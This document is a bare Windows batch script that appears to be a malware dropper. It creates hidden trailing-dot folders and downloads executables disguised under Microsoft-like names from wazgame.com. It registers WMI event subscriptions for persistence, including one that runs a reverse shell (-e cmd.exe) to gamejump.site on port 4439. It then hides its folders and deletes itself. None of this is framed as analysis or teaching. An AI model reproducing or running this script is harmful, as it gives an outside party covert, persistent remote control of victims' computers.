@echo off
mkdir C:\ProgramData\Packag
mkdir C:\ProgramData\SoftwareDistribution
mkdir \\.\C:\ProgramData\Package..\
mkdir \\.\C:\ProgramData\NUL..\
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="pers"", Consumer="CommandLineEventConsumer.Name="pers""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nut", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nut", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="nut"", Consumer="CommandLineEventConsumer.Name="nut""
powershell.exe iwr https://wazgame.com/store.vbs -o C:\ProgramData\SoftwareDistribution\store.vbs
powershell.exe iwr https://wazgame.com/libssl-1_1.dll -o C:\ProgramData\USOShared\libssl-1_1.dll
powershell.exe iwr https://wazgame.com/libcrypto-1_1.dll -o C:\ProgramData\USOShared\libcrypto-1_1.dll
powershell.exe iwr https://wazgame.com/StartMenuExperienceHost.exe -o C:\ProgramData\USOShared\StartMenuExperienceHost.exe
powershell.exe iwr https://wazgame.com/WmiPrv.exe -o C:\ProgramData\Packag\WmiPrv.exe
powershell.exe iwr https://wazgame.com/utshellext.dll -o C:\ProgramData\Packag\utshellext.dll
powershell.exe iwr https://aka.ms/vs/17/release/vc_redist.x86.exe -o C:\ProgramData\vc_redist.x86.exe && C:\ProgramData\vc_redist.x86.exe /Q /A /norestart
copy C:\ProgramData\Packag\WmiPrv.exe \\.\C:\ProgramData\Package..\WmiPrv.exe
copy C:\ProgramData\Packag\utshellext.dll \\.\C:\ProgramData\Package..\utshellext.dll
copy C:\ProgramData\USOShared\libssl-1_1.dll \\.\C:\ProgramData\NUL..\libssl-1_1.dll
copy C:\ProgramData\USOShared\libcrypto-1_1.dll \\.\C:\ProgramData\NUL..\libcrypto-1_1.dll
copy C:\ProgramData\USOShared\StartMenuExperienceHost.exe \\.\C:\ProgramData\NUL..\StartMenuExperienceHost.exe
attrib +h +s +r C:\ProgramData\Packag
attrib +h +s +r C:\ProgramData\USOShared
del/a/f "%~f0"